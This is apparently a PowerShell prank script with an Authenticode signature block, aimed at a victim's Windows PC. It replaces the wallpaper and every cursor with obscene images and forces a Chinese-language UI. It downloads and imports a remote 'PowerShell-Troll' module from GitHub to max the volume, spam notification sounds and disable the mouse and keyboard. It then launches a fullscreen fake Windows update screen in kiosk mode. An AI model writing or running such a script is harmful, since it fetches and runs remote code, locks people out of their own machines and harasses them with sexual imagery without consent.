# Function for changing WallPaper
Function Set-WallPaper {
param (
    [parameter(Mandatory=$True)]
    # Provide path to image
    [string]$Image,
    # Provide wallpaper style that you would like applied
    [parameter(Mandatory=$False)]
    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
    [string]$Style
)

$WallpaperStyle = Switch ($Style) {
 
    "Fill" {"10"}
    "Fit" {"6"}
    "Stretch" {"2"}
    "Tile" {"0"}
    "Center" {"0"}
    "Span" {"22"}
 
}

If($Style -eq "Tile") {

    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force

}
Else {

    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force

}

Add-Type -TypeDefinition @" 
using System; 
using System.Runtime.InteropServices;
 
public class Params
{ 
    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
    public static extern int SystemParametersInfo (Int32 uAction, 
                                                   Int32 uParam, 
                                                   String lpvParam, 
                                                   Int32 fuWinIni);
}
"@ 
 
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
 
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
 
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}

# Define a C# class for calling WinAPI.
Add-Type -TypeDefinition @'
public class SysParamsInfo {
    [System.Runtime.InteropServices.DllImport("user32.dll", EntryPoint = "SystemParametersInfo")]
    public static extern bool SystemParametersInfo(uint uiAction, uint uiParam, uint pvParam, uint fWinIni);
    
    const int SPI_SETCURSORS = 0x0057;
    const int SPIF_UPDATEINIFILE = 0x01;
    const int SPIF_SENDCHANGE = 0x02;

    public static void CursorHasChanged() {
        SystemParametersInfo(SPI_SETCURSORS, 0, 0, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }
}
'@

# Change the Cursors
Set-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name 'Arrow' -Value 'Z:\penis.ani'
Set-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name 'Wait' -Value 'Z:\penis.ani'
Set-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name 'Hand' -Value 'Z:\penis.ani'
Set-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name 'AppStarting' -Value 'Z:\penis.ani'
Set-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name 'Help' -Value 'Z:\penis.ani'
Set-ItemProperty -Path 'HKCU:\Control Panel\Cursors' -Name 'Hand' -Value 'Z:\penis.ani'
# Change the WallPaper
Set-WallPaper -Image 'Z:\Dicked.png' -Style Fill
# Notify the system about settings change by calling the C# code
[SysParamsInfo]::CursorHasChanged()
#Install LanguagePack
Add-AppxProvisionedPackage -Online -PackagePath .\zh-cn\LanguageExperiencePack.zh-CN.Neutral.appx -LicensePath .\zh-cn\License.xml 
Set-WinUILanguageOverride -Language zh-CN
New-WinUserLanguageList -Language zh-CN
Set-WinUserLanguageList zh-CN -Force
#User PowerShell-Trolls
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/perplexityjeff/PowerShell-Troll/master/PSTrollFunctions.psm1" -OutFile "PSTrollFunctions.psm1"
Import-Module .\PSTrollFunctions.psm1
Set-AudioMax
Send-NotificationSoundSpam
Disable-Mouse
Disable-Keyboard
#Open FakeUpdateScreen
$OS = (Get-WMIObject win32_operatingsystem).name
if ($OS -contains "Windows 11") {
    Start-Process -FilePath "msedge.exe" -ArgumentList '--kiosk https://updatefaker.com/windows11/index.html --edge-kiosk-type=fullscreen'
} elseif ($OS -contains "Windows 10") {
    Start-Process -FilePath "msedge.exe" -ArgumentList '--kiosk https://updatefaker.com/windows10/index.html --edge-kiosk-type=fullscreen'
}


# SIG # Begin signature block
# MIIFcAYJKoZIhvcNAQcCoIIFYTCCBV0CAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQUnkXlQQw+h8d5aUnPKaH50JiT
# Fv+gggMKMIIDBjCCAe6gAwIBAgIQFfjo4AQq14tFg1sflO2UbjANBgkqhkiG9w0B
# AQsFADAbMRkwFwYDVQQDDBBBVEEgQXV0aGVudGljb2RlMB4XDTIyMTAxNjAwMjky
# MloXDTIzMTAxNjAwNDkyMlowGzEZMBcGA1UEAwwQQVRBIEF1dGhlbnRpY29kZTCC
# ASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK6NmpzKQR7CPz3umcNj19Is
# 9rzs/YNVfDRqKPL/5BtMf3toO1p2iRTuHV4iCLevEKuJRxw4EWCcrPxHdrGdTGL2
# g6bofD/z6k9u5hc03CG9MTPCgVfs1wXSZHVRe7889eXwyNJhF699FpQI6/xB4jzQ
# IS2ZlH/2scyG5ltQvEmMJ3/MlKx1/NCeXHGnOwSU0vRyEWnm5GfP7vaxZDi64cqz
# yIj5ClARPsUTGuV6J/Nhd+eBnAE3NRjVXZgibMJm7Y1XqZCH7g85qvxI7MJVmhqM
# 95n0YZWR8L9uh6t+F2xy3zs+qklFXQUaJz1tnDefQXYgYKPRTFoeCcKraM1hagkC
# AwEAAaNGMEQwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQMMAoGCCsGAQUFBwMDMB0G
# A1UdDgQWBBQlaLox9BsJzaVp/s+5ujO6OWxfOjANBgkqhkiG9w0BAQsFAAOCAQEA
# nV8bMBPcfwJqcGTKXQ5SXUVess/fOUElqPl/OkxThdhsblIq9cUhbfJgl9hsLR6T
# RptoDbyewggon16yLAb+PXcw4JYCGk3Nk8ctIPNyaPdVS/r0l5XenLCS1BKBe784
# odc8aohmkJVRYdLag6QRo72sATLXA54hW0KS1VDEjeOBiv6CHzWE96wFrhip8LvU
# g2u1htkRlQDMfL9GXqKNkVP7/3Gk/MDU36qgL7TxOImOkNfSbLWhH2iVDG3fvj+7
# AHsNvok141DJsA3aae4JRMJh/e6Q+RxjUHQVhAZP14SClPYMI4UBqCTtsra6GZe+
# t740PniV4jJq/gXzHo8rdjGCAdAwggHMAgEBMC8wGzEZMBcGA1UEAwwQQVRBIEF1
# dGhlbnRpY29kZQIQFfjo4AQq14tFg1sflO2UbjAJBgUrDgMCGgUAoHgwGAYKKwYB
# BAGCNwIBDDEKMAigAoAAoQKAADAZBgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAc
# BgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUvGDB
# D8vuSM6MithB73OCGCt8f9AwDQYJKoZIhvcNAQEBBQAEggEAoHpKtNFICX0PQciV
# GQStVrrigXNoPLDhbJG3pCb/bOHEutbjjasWz9hxf3EhhiojopJoRkkHkvQNxdDm
# g9uGVs06ggCbsd+6tD/aqrXIAEdLJe+efD6Ofu3rLC7Fkdycl+5CyDwRMT/4e9ty
# yO2PgshpRbRyaROdepvENbRK8kJgh2HNf2GS9RfPxwucTANpHndHDj9Vrs93U4vb
# 08WvDFMvYPaQZrA4GQLfHDskpDbso6KZD+t3zS8/q1WUZdcJBZBXnsjJ533rSxTi
# CAbsCzANf6zN39fM85tE0x99R8J9KGjOZOoP/EHMCKOQKfpHikjhMNw9rdC7iC21
# 1h5XGw==
# SIG # End signature block
